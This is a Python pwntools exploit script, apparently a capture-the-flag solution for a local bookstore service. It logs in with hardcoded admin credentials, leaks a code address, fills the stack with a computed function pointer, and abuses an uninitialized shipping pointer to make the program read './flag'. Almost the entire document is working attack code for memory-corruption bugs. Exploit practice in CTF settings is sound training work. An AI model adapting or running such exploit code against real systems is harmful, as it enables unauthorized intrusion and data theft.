from pwn import *

def talk(send, until, no_newline=False):
	if until:
		str = r.recvuntil(until)
		print str + send
		if no_newline:
			r.send(send)
		else:
			r.sendline(send)
	else:
		str = r.recv()
		print str + send
		if no_newline:
			r.send(send)
		else:
			r.sendline(send)

r = remote('localhost', 8020)

# Login
talk('helloadmin', 'ID : ')
talk('iulover!@#$%', 'PASSWORD : ')

# Add Book
talk('1', '> ')
talk('book', '\n')
talk('desc', '\n')
talk('0', '\n')

# Modify Price and Stock
talk('2', '> ')
talk('0', 'No : ')
talk('3', 'menu!\n')
talk('-1', '\n')
talk('-1', '\n')
talk('0', '\n')
talk('1', '\n')
talk('aaaa'*100, '\n')
talk('xxxx'*100, 'description\n')
talk('0', 'menu!\n')

# Get Offset
talk('4', '> ')

offset_before = r.recvuntil('a'*20)
offset_str = r.recvuntil('> ')
offset = u32(offset_str[8:12])
log.success("%x" % offset)
offset = offset - 0x9AD + 0x8DB
log.success("%x" % offset)
print offset_before + offset_str

# Fill Stack
r.sendline('2')
talk('0', 'No : ')
talk('2', 'menu!\n')
talk(p32(offset)*750, '\n')

# Uninitialized Shipping Pointer
talk('3', 'menu!\n')
talk('-1', '\n')
talk('-1', '\n')
talk('0', '\n')
talk('1', '\n')
talk('./flag', '\n', no_newline=True)
talk('desc', 'description\n')

# Modify Freeshipping
talk('4', 'menu!\n')
talk('1', '\n')
talk('0', 'menu!\n')

# Call ViewBook
talk('3', '> ')
talk('0', 'No : ')

# Close Program
talk('0', '> ')
